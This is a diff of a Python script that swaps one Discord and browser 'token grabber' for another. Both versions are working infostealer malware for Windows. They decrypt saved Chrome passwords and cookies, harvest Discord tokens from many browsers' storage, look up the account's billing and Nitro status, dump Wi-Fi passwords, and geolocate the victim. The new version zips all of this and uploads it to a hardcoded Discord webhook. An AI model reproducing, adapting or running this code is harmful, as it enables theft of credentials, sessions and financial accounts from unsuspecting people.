@@ -1,81 +1,17 @@
-#CREDITS: 'https://github.com/Rdimo' for base code :)
-# Modified version of 'Hazard Grabber' -- Name: ShAdOw Grabber
-
-import os
-if os.name != "nt":
-	exit()
+import os 
 import sys
-import base64
-from json import loads, dumps
-import json
-from base64 import b64decode
+import json     
 import subprocess
-from subprocess import Popen, PIPE
-from urllib.request import Request, urlopen
-from datetime import timezone, datetime, timedelta
-
-webhook_url = "%WEBHOOK%"
-path = r'C:\Windows\Temp\LocalCustom\ssh\new\custom'
-if not os.path.exists(path):
-    os.makedirs(path)
-
-languages = {
-	'da'    : 'Danish, Denmark',
-	'de'    : 'German, Germany',
-	'en-GB' : 'English, United Kingdom',
-	'en-US' : 'English, United States',
-	'es-ES' : 'Spanish, Spain',
-	'fr'    : 'French, France',
-	'hr'    : 'Croatian, Croatia',
-	'lt'    : 'Lithuanian, Lithuania',
-	'hu'    : 'Hungarian, Hungary',
-	'nl'    : 'Dutch, Netherlands',
-	'no'    : 'Norwegian, Norway',
-	'pl'    : 'Polish, Poland',
-	'pt-BR' : 'Portuguese, Brazilian, Brazil',
-	'ro'    : 'Romanian, Romania',
-	'fi'    : 'Finnish, Finland',
-	'sv-SE' : 'Swedish, Sweden',
-	'vi'    : 'Vietnamese, Vietnam',
-	'tr'    : 'Turkish, Turkey',
-	'cs'    : 'Czech, Czechia, Czech Republic',
-	'el'    : 'Greek, Greece',
-	'bg'    : 'Bulgarian, Bulgaria',
-	'ru'    : 'Russian, Russia',
-	'uk'    : 'Ukranian, Ukraine',
-	'th'    : 'Thai, Thailand',
-	'zh-CN' : 'Chinese, China',
-	'ja'    : 'Japanese',
-	'zh-TW' : 'Chinese, Taiwan',
-	'ko'    : 'Korean, Korea'
-}
-
-chromefile = 'chrome_dump.txt'
-comepleteName = os.path.join(path,chromefile)
-LOCAL = os.getenv("LOCALAPPDATA")
-ROAMING = os.getenv("APPDATA")
-
-PATHS = {
-	"Discord"           : ROAMING + "\\Discord",
-	"Discord Canary"    : ROAMING + "\\discordcanary",
-	"Discord PTB"       : ROAMING + "\\discordptb",
-	"Google Chrome"     : LOCAL + r"\\Google\\Chrome\\User Data\\Default",
-	"Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
-	"Opera GX"			: ROAMING + "\\Opera Software\\Opera GX Stable",
-	"Brave"             : LOCAL + r"\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-	"Yandex"            : LOCAL + r"\\Yandex\\YandexBrowser\\User Data\\Default"
-}
+import base64 
+from datetime import datetime
 def install (package):
     subprocess. check_call ([sys. executable, "-m", "pip", "install", package])
+def uninstall (package):
+    subprocess. check_call ([sys. executable, "-m", "pip", "uninstall", package])
 try:
-	import win32crypt
-	from dhooks import Webhook, File
+	from win32crypt import CryptUnprotectData
 except ImportError or NameError or ModuleNotFoundError:
 	install('pywin32')
-try:
-    from dhooks import Webhook, File
-except ImportError or NameError or ModuleNotFoundError:
-    install('dhooks')
 try:
 	import shutil
 except ImportError or NameError or ModuleNotFoundError:
@@ -104,305 +40,295 @@ except ImportError or NameError or ModuleNotFoundError:
 try:
     from Crypto.Cipher import AES
 except ImportError or NameError or ModuleNotFoundError:
-    install('cryptography')
+	uninstall('crypto')
+	uninstall('pycrypto')
+	install('pycryptodome')
+try:
+    import zipfile
+except ImportError or NameError or ModuleNotFoundError:
+    install('zipfile')
+class Hazard_Token_Grabber_V2:
+    def __init__(self):
+        self.webhook = "https://discord.com/api/webhooks/913834043232124948/Tvju08mCHTZBHM9ryr7e3eVsXg9R7OcpIb0Iz-5pJE_pnba_cOljv-7WtL_6F0z2DBdU"
+        self.files = ""
+        self.appdata = os.getenv("localappdata")
+        self.roaming = os.getenv("appdata")
+        self.tempfolder = os.getenv("temp")+"\\Hazard_Token_Grabber_V2"
 
-
-sysinfo = f"""
-        Operating System: {plt.system()}
-        Computer Name: {plt.node()}
-        Username: {getpass.getuser()}
-        Release Version: {plt.release()}
-        Processor Architecture: {plt.processor()}
-                    """
-hook = Webhook(webhook_url)
-def getheaders(token=None, content_type="application/json"):
-	headers = {
-		"Content-Type": content_type,
-		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
-	}
-	if token:
-		headers.update({"Authorization": token})
-	return headers
-
-def getuserdata(token):
-	try:
-		return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
-	except:
-		pass
-
-def gettokens(path):
-	path += "\\Local Storage\\leveldb"
-	tokens = []
-	for file_name in os.listdir(path):
-		if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
-			continue
-		for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
-			for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
-				for token in findall(regex, line):
-					tokens.append(token)
-	return tokens
-
-def get_chrome_datetime(chromedate):
-    """Return a `datetime.datetime` object from a chrome format datetime
-    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
-    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
-
-def get_encryption_key():
-    local_state_path = os.path.join(os.environ["USERPROFILE"],
-                                    "AppData", "Local", "Google", "Chrome",
-                                    "User Data", "Local State")
-    with open(local_state_path, "r", encoding="utf-8") as f:
-        local_state = f.read()
-        local_state = json.loads(local_state)
-
-    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-    key = key[5:]
-    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-
-
-def decrypt_password(password, key):
-    try:
-        iv = password[3:15]
-        password = password[15:]
-        cipher = AES.new(key, AES.MODE_GCM, iv)
-        return cipher.decrypt(password)[:-16].decode()
-    except:
         try:
-            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
+            os.mkdir(os.path.join(self.tempfolder))
         except:
-            return ""
+            pass
 
+        self.tokens = []
+        self.saved = []
 
-def chrome():
-	f = open(comepleteName, "w")
-	key = get_encryption_key()
-	db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
-							"Google", "Chrome", "User Data", "default", "Login Data")
-	filename = "ChromeData.db"
-	shutil.copyfile(db_path, filename)
-	db = sqlite3.connect(filename)
-	cursor = db.cursor()
-	cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
-	for row in cursor.fetchall():
-		origin_url = row[0]
-		action_url = row[1]
-		username = row[2]
-		password = decrypt_password(row[3], key)
-		date_created = row[4]
-		date_last_used = row[5]
-
-		if username or password:
-			Origin_Url1 =f"\nOrigin URL: {origin_url}\n"
-			f.write(Origin_Url1)
-			Action_URL1 = f"Action URL: {action_url}\n"
-			f.write(Action_URL1)
-			Username1 = f"Username: {username}\n"
-			f.write(Username1)
-			password1 = f"Password: {password}\n"
-			f.write(password1)
-		else:
-			continue
-		if date_created != 86400000000 and date_created:
-			Creation_date1 = f"Creation date: {str(get_chrome_datetime(date_created))}\n"
-			f.write(Creation_date1)
-		if date_last_used != 86400000000 and date_last_used:
-			Last_Used1 = f"Last Used: {str(get_chrome_datetime(date_last_used))}\n"
-			f.write(Last_Used1)
-		blah = "="*50
-		f.write(blah)
-
-	cursor.close()
-	db.close()
-	try:
-		os.remove(filename)
-		os.remove(comepleteName)
-	except:
-		pass
-		f.close()
-
-def gethwid():
-    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
-    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
-
-def getwifi():
-    global answer
-    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
-    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
-    for i in profiles:
-        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode(
-            'utf-8').split(
-            '\n')
-        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
+        if not os.path.exists(self.appdata+'\\Google'):
+            self.files += f"**{os.getlogin()}** doesn't have google installed\n"
+        else:
+            self.grabPassword()
+            self.grabCookies()
+        self.grabTokens()
+        self.SendInfo()
         try:
-            d = ("{:<30}|  {:<}".format(i, results[0]))
-            answer = d
-        except IndexError:
-            p = ("{:<30}|  {:<}".format(i, ""))
-            answer = p
-    return answer
+            shutil.rmtree(self.tempfolder)
+        except(PermissionError, FileExistsError):
+            pass
 
-def get_chrome_file():
-	hook.modify(name='ShAdOw Grabber', avatar=None)
-	file = File(comepleteName, name='chrome_dump.txt')
-	hook.send(f'chrome dump:', file=file)
+    def getheaders(self, token=None, content_type="application/json"):
+        headers = {
+            "Content-Type": content_type,
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
+        }
+        if token:
+            headers.update({"Authorization": token})
+        return headers
 
-def getip():
-	ip = org = loc = city = country = region = googlemap = "None"
-	try:
-		url = 'http://ipinfo.io/json'
-		response = urlopen(url)
-		data = json.load(response)
-		ip = data['ip']
-		org = data['org']
-		loc = data['loc']
-		city = data['city']
-		country = data['country']
-		region = data['region']
-		googlemap = "https://www.google.com/maps/search/google+map++" + loc
-	except:
-		pass
-	return ip,org,loc,city,country,region,googlemap
+    def get_master_key(self):
+        with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r") as f:
+            local_state = f.read()
+        local_state = json.loads(local_state)
+        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = master_key[5:]
+        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+        return master_key
+    
+    def decrypt_payload(self, cipher, payload):
+        return cipher.decrypt(payload)
+    
+    def generate_cipher(self, aes_key, iv):
+        return AES.new(aes_key, AES.MODE_GCM, iv)
+    
+    def decrypt_password(self, buff, master_key):
+        try:
+            iv = buff[3:15]
+            payload = buff[15:]
+            cipher = self.generate_cipher(master_key, iv)
+            decrypted_pass = self.decrypt_payload(cipher, payload)
+            decrypted_pass = decrypted_pass[:-16].decode()
+            return decrypted_pass
+        except:
+            return "Chrome < 80"
+    
+    def grabPassword(self):
+        master_key = self.get_master_key()
+        f = open(self.tempfolder+"\\Google Passwords.txt", "w", encoding="cp437", errors='ignore')
+        f.write("Made by #### | https://github.com/#####\n\n")
+        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
+        try:
+            shutil.copy2(login_db, "Loginvault.db")
+        except FileNotFoundError:
+            pass
+        conn = sqlite3.connect("Loginvault.db")
+        cursor = conn.cursor()
+        try:
+            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+            for r in cursor.fetchall():
+                url = r[0]
+                username = r[1]
+                encrypted_password = r[2]
+                decrypted_password = self.decrypt_password(encrypted_password, master_key)
+                if url != "":
+                    f.write(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
+        except:
+            pass
+        f.close()
+        cursor.close()
+        conn.close()
+        try:
+            os.remove("Loginvault.db")
+        except:
+            pass  
 
-def getavatar(uid, aid):
-	url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
-	try:
-		urlopen(Request(url))
-	except:
-		url = url[:-4]
-	return url
+    def grabCookies(self):
+        master_key = self.get_master_key()
+        f = open(self.tempfolder+"\\Google Cookies.txt", "w", encoding="cp437", errors='ignore')
+        f.write("Made by #### | https://github.com/#####\n\n")
+        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\cookies'
+        try:
+            shutil.copy2(login_db, "Loginvault.db")
+        except FileNotFoundError:
+            pass
+        conn = sqlite3.connect("Loginvault.db")
+        cursor = conn.cursor()
+        try:
+            cursor.execute("SELECT host_key, name, encrypted_value from cookies")
+            for r in cursor.fetchall():
+                Host = r[0]
+                user = r[1]
+                encrypted_cookie = r[2]
+                decrypted_cookie = self.decrypt_password(encrypted_cookie, master_key)
+                if Host != "":
+                    f.write(f"Host: {Host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
+        except:
+            pass
+        f.close()
+        cursor.close()
+        conn.close()
+        try:
+            os.remove("Loginvault.db")
+        except:
+            pass
 
-def has_payment_methods(token):
-	global nitro_data
-	try:
-		nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token)).json()
-		return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
-	except:
-		pass
+    def grabTokens(self):
+        f = open(self.tempfolder+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
+        f.write("Made by #### | https://github.com/####\n\n")
+        paths = {
+            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
+            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
+            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
+            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
+            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
+            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
+            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
+            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
+            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
+            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
+            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
+            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
+            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
+            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
+            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
+            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
+            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
+        }
 
-def tokengrabber():
-	embeds = []
-	working = []
-	checked = []
-	working_ids = []
-	computer_os = plt.platform()
-	getwifinetwork,getwifipassword = getwifi().split('|')
-	try:
-		chrome_dump = chrome()
-	except:
-		chrome_dump = 'Not Available'
-	getchromefile = get_chrome_file()
-	ip,org,loc,city,country,region,googlemap = getip()
-	pc_username = os.getenv("UserName")
-	pc_name = os.getenv("COMPUTERNAME")
-	for platform, path in PATHS.items():
-		if not os.path.exists(path):
-			continue
-		for token in gettokens(path):
-			if token in checked:
-				continue
-			checked.append(token)
-			uid = None
-			if not token.startswith("mfa."):
-				try:
-					uid = b64decode(token.split(".")[0].encode()).decode()
-				except:
-					pass
-				if not uid or uid in working_ids:
-					continue
-			user_data = getuserdata(token)
-			if not user_data:
-				continue
-			working_ids.append(uid)
-			working.append(token)
-			username = user_data["username"] + "#" + str(user_data["discriminator"])
-			user_id = user_data["id"]
-			locale = user_data['locale']
-			avatar_id = user_data["avatar"]
-			avatar_url = getavatar(user_id, avatar_id)
-			email = user_data.get("email")
-			phone = user_data.get("phone")
-			verified = user_data['verified']
-			mfa_enabled = user_data['mfa_enabled']
-			flags = user_data['flags']
-			creation_date = datetime.fromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime("%d-%m-%Y %H:%M:%S")
+        for source, path in paths.items():
+            if not os.path.exists(path):
+                continue
+            for file_name in os.listdir(path):
+                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                    continue
+                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                        for token in findall(regex, line):
+                            self.tokens.append(token)
+        for token in self.tokens:
+            r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
+            if r.status_code == 200:
+                if token in self.saved:
+                    continue
+                self.saved.append(token)
+                j = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token)).json()
+                badges = ""
+                flags = j['flags']
+                if (flags == 1):
+                    badges += "Staff, "
+                if (flags == 2):
+                    badges += "Partner, "
+                if (flags == 4):
+                    badges += "Hypesquad Event, "
+                if (flags == 8):
+                    badges += "Green Bughunter, "
+                if (flags == 64):
+                    badges += "Hypesquad Bravery, "
+                if (flags == 128):
+                    badges += "HypeSquad Brillance, "
+                if (flags == 256):
+                    badges += "HypeSquad Balance, "
+                if (flags == 512):
+                    badges += "Early Supporter, "
+                if (flags == 16384):
+                    badges += "Gold BugHunter, "
+                if (flags == 131072):
+                    badges += "Verified Bot Developer, "
+                if (badges == ""):
+                    badges = "None"
 
-			language = languages.get(locale)
-			nitro = bool(user_data.get("premium_type"))
-			billing = bool(has_payment_methods(token))
-			embed1 = {
-				"color": 16507654,
-				"fields": [
-					{
-						"name": "**Account Info**",
-						"value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
-						"inline": True
-					},
-					{
-						"name": "**Pc Info**",
-						"value": f'OS: {computer_os}\nUsername: {pc_username}\nPc Name: {pc_name}\nHwid:\n{gethwid()}',
-						"inline": True
-					},
-					{
-						"name": "--------------------------------------------------------------------------------------------------",
-						"value":"**-----------------------------------------------------------------------------------------------**",
-						"inline": False
-					},
-					{
-						"name": "**IP**",
-						"value": f'IP: {ip}\nMap location: [{loc}]({googlemap})\nCity: {city}\nRegion: {region}\nOrg: {org}',
-						"inline": True
-					},
-					{
-						"name": "**Other Info**",
-						"value": f'Locale: {locale} ({language})\nToken Location: {platform}\nEmail Verified: {verified}\n2fa Enabled: {mfa_enabled}\nCreation Date: {creation_date}',
-						"inline": True
-					},
-					{
-						"name": "**Token**",
-						"value": f"`{token}`",
-						"inline": False
-					},
-                    {
-						"name": "--------------------------------------------------------------------------------------------------",
-						"value":"**-----------------------------------------------------------------------------------------------**",
-						"inline": False
-					},
-                    {
-						"name": "**wifi**",
-						"value":f'NETWORK: {getwifinetwork} PASSWORD: {getwifipassword}',
-						"inline": True
-					},
-					{
-						"name": "--------------------------------------------------------------------------------------------------",
-						"value":"**--------------------------------------------------------------------------------------------------**",
-						"inline": False
-					},
-					 {
-						"name": "**Credit Card Information**",
-						"value":f'{nitro_data}',
-						"inline": True
-					},
-				],
-				"author": {
-					"name": f"{username}・{user_id}",
-					"icon_url": avatar_url
-				},
-				"footer": {
-					"text": "ShAdOw Grabber By ######・https://github.com/########"
-				}
-			}
-			embeds.append(embed1)
+                user = j["username"] + "#" + str(j["discriminator"])
+                email = j["email"]
+                phone = j["phone"] if j["phone"] else "No Phone Number attached"
 
-	if len(working) == 0:
-		working.append('123')
-	webhook1 = {
-		"content": "",
-		"embeds": embeds,
-		"username": "ShAdOw Grabber",
-		"avatar_url": "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg"
-	}
-	try:
-		urlopen(Request(webhook_url, data=dumps(webhook1).encode(), headers=getheaders()))
-	except Exception as e:
-		print(e)
-tokengrabber()
+                url = f'https://cdn.discordapp.com/avatars/{j["id"]}/{j["avatar"]}.gif'
+                try:
+                    requests.get(url)
+                except:
+                    url = url[:-4]
+
+                nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()
+                has_nitro = False
+                has_nitro = bool(len(nitro_data) > 0)
+
+                billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
+                
+                f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n[Avatar]({url})\n\n")
+        f.close()
+
+
+    def SendInfo(self):
+        try:
+            data = requests.get("http://ipinfo.io/json").json()
+            ip = data['ip']
+            city = data['city']
+            country = data['country']
+            region = data['region']
+            googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
+        except:
+            pass
+        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
+        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
+        for i in profiles:
+            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode(
+                'utf-8').split(
+                '\n')
+            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
+            try:
+                d = ("{:<30}|  {:<}".format(i, results[0]))
+                answer = d
+            except IndexError:
+                p = ("{:<30}|  {:<}".format(i, ""))
+                answer = p
+        getwifinetwork,getwifipassword = answer.split('|')
+        sysinfo = f"Operating System: {plt.system()}\nComputer Name: {plt.node()}\nUsername: {getpass.getuser()}\nRelease Version: {plt.release()}\nProcessor Architecture: {plt.processor()} "
+        temp = os.path.join(self.tempfolder)
+        new = os.path.join(self.appdata, f'Hazard.V2-[{os.getlogin()}].zip')
+        self.zip(temp, new)
+        for dirname, _, files in os.walk(self.tempfolder):
+            for f in files:
+                self.files += f"\n{f}"
+        n = 0
+        for r, d, files in os.walk(self.tempfolder):
+            n+= len(files)
+            self.fileCount = f"{n} Files Found: "
+        embed = {
+            "avatar_url":"https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+            "embeds": [
+                {
+                    "author": {
+                        "name": "Xenos Grabber",
+                        "url": "https://github.com/#####",
+                        "icon_url": "https://cdn.discordapp.com/attachments/828047793619861557/891698193245560862/Hazard.gif"
+                    },
+                    "description": f"**XENOS WAS RAN**\n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```\n[Google Maps Location]({googlemap})\n```fix\nnetwork:   {getwifinetwork}\npassword:{getwifipassword}```\nSYSTEM INFO```{sysinfo}```",
+                    "color": 16111121,
+
+                    "thumbnail": {
+                      "url": "https://media.discordapp.net/attachments/816235522867462194/913888401118339163/xenos.gif?width=720&height=540"
+                    },       
+
+                    "footer": {
+                      "text": "Dead but Dreaming"
+                    }
+                }
+            ]
+        }
+        requests.post(self.webhook, json=embed)
+        requests.post(self.webhook, files={'upload_file': open(new,'rb')})
+
+    def zip(self, src, dst):
+        zipped_file = zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED)
+        abs_src = os.path.abspath(src)
+        for dirname, _, files in os.walk(src):
+            for filename in files:
+                absname = os.path.abspath(os.path.join(dirname, filename))
+                arcname = absname[len(abs_src) + 1:]
+                zipped_file.write(absname, arcname)
+        zipped_file.close()
+
+if __name__ == "__main__":
+    Hazard_Token_Grabber_V2()
